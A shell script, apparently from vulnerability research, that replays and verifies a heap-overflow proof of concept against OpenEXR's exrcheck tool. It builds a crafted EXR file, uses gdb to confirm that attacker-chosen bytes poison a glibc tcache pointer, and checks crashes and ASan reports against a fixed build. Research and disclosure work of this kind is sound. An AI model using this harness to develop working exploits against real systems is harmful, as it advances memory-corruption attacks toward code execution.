#!/bin/sh
# W192: one-command replay. At N=768/U=4N the in-bounds COPY1 leaves the
# unpacked chunk header intact; COPY2 still puts file-chosen bytes in a live
# glibc tcache `next` word in the UNMODIFIED upstream exrcheck -c binary.
# A 21-point sweep and a six-pass forged-prefix iteration bound the claim:
# no malloc consumes the poisoned entry and rung 5 stays UNKNOWN.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-w192 evidence

for spec in \
    'cases/make_poc_mixed_full.py 90f3f6fa759cfbd1453db7b161e2b6d8d67eba2b2e9978ea74b68f91d44d52c2' \
    'harness/w192-head-enum.cmd 4b1420c704b89c6a5ab1376fb11664c7e6204b80cf548dc91a7726decd7c6acf' \
    'harness/w192-preserve-probe.cmd e27db1ff60754691a1e4655465097c189d4c33a520fb887b2d64b2219a8035ab' \
    'harness/w192-u4n-head-sweep.py b0296edc095353268c7f77032d8f7632c0fc0c3c7eb515510ee6daefdebf8ae1' \
    'harness/w192-forge.py f9ca2d480cb34a42c0dad035b91b4e62e33853cf8a7239ca200537ea1ba91063'
do
    set -- $spec
    test "$(sha256sum "$1" | cut -d' ' -f1)" = "$2"
done

bin-vuln-plain/gen_baseline_deep_mixed work-w192/baseline.exr > /dev/null
test "$(sha256sum work-w192/baseline.exr | cut -d' ' -f1)" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04
python3 cases/make_poc_mixed_full.py work-w192/baseline.exr \
    work-w192/p0768.exr 768 0x5a > /dev/null
test "$(sha256sum work-w192/p0768.exr | cut -d' ' -f1)" = \
    be6c5a10feea3c5a0198d79964692e7d7ca45aa5994d1eca92bc64be1417984f

norm() {
    awk '
        { gsub(/==[0-9]+==/, "==PID==") }
        { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
        { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
        { print }
    '
}

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT
gdb -q -batch -ex 'set pagination off' -ex 'set confirm off' \
    -ex 'set disable-randomization on' \
    -ex 'set $dumpfile = "work-w192/pre-copy2-n0768.bin"' \
    -ex 'break sort2_4ByteChannels_tiled' \
    -ex 'run -c work-w192/p0768.exr' \
    -x harness/w192-preserve-probe.cmd ./build-vuln-plain/bin/exrcheck \
    > "$RAW" 2>&1 || true
grep -q 'NEXT-AFTER-VAL=0x5a5a5a5a5a5a5a5a' "$RAW"
norm < "$RAW" > evidence/w192-gdb-n0768.out
g=evidence/w192-gdb-n0768.out
grep -q 'WINDOW_HEADS=\[(7, 4304)\]' "$g"
grep -q 'TCACHE-WATCH idx=7 off=+4304 ptr=ADDR' "$g"
grep -q 'COPY1 dst-out=+0 len=3072' "$g"
grep -q 'COPY2 dst-out=+3072 len=1536' "$g"
grep -q '^NEXT-BEFORE-VAL=ADDR$' "$g"
grep -q '^NEXT-AFTER-VAL=ADDR$' "$g"
grep -q 'double free or corruption' "$g"
test "$(head -c 16 work-w192/pre-copy2-n0768.bin | sha256sum | cut -d' ' -f1)" = \
    c9536f755e345a275a9a663061bf1571d92dfc55f0dce4f38a7e8826c70936d7

set +e
./build-vuln-plain/bin/exrcheck -c work-w192/p0768.exr \
    > evidence/w192-plain-n0768.out 2>&1
plain_rc=$?
./build-vuln-plain/bin/exrcheck -c work-w192/baseline.exr \
    > evidence/w192-valid.out 2>&1
valid_rc=$?
./build-fixed-asan/bin/exrcheck -c work-w192/p0768.exr \
    > evidence/w192-fixed.out 2>&1
fixed_rc=$?
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr \
    ./build-vuln-asan/bin/exrcheck -c work-w192/p0768.exr \
    > "$RAW" 2>&1
asan_rc=$?
set -e
[ "$plain_rc" -eq 134 ]
[ "$valid_rc" -eq 0 ]
[ "$fixed_rc" -eq 1 ]
[ "$asan_rc" -eq 1 ]
grep -q 'OK' evidence/w192-valid.out
grep -q 'bad' evidence/w192-fixed.out
norm < "$RAW" > evidence/w192-asan.out
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' evidence/w192-asan.out
grep -q 'READ of size 3072' evidence/w192-asan.out
grep -q 'internal_zstd.c:472' evidence/w192-asan.out

python3 harness/w192-u4n-head-sweep.py > evidence/w192-sweep-console.out
grep -q '^HITS=\[768, 896\]$' evidence/w192-sweep-console.out
test "$(sha256sum evidence/w192-u4n-head-sweep.out | cut -d' ' -f1)" = \
    79ba9ea5c99292c0bd16c2c27c3e3a773d85da671c1d67688e640af8007cec86

python3 harness/w192-forge.py > evidence/w192-forge-console.out
f=evidence/w192-forge-console.out
grep -q '^ITER=0 HEAD=4304 AFTER=5a5a5a5a5a5a5a5a HIT=True' "$f"
! grep -q 'AFTER=4141414141414141' "$f"
set +e
./build-vuln-plain/bin/exrcheck -c work-w192/p0768.exr \
    > evidence/w192-forge-final.out 2>&1
forge_rc=$?
set -e
[ "$forge_rc" -eq 139 ]

printf 'RESULT PASS\n'
sha256sum evidence/w192-gdb-n0768.out evidence/w192-plain-n0768.out \
    evidence/w192-valid.out evidence/w192-fixed.out evidence/w192-asan.out \
    evidence/w192-u4n-head-sweep.out evidence/w192-forge-final.out
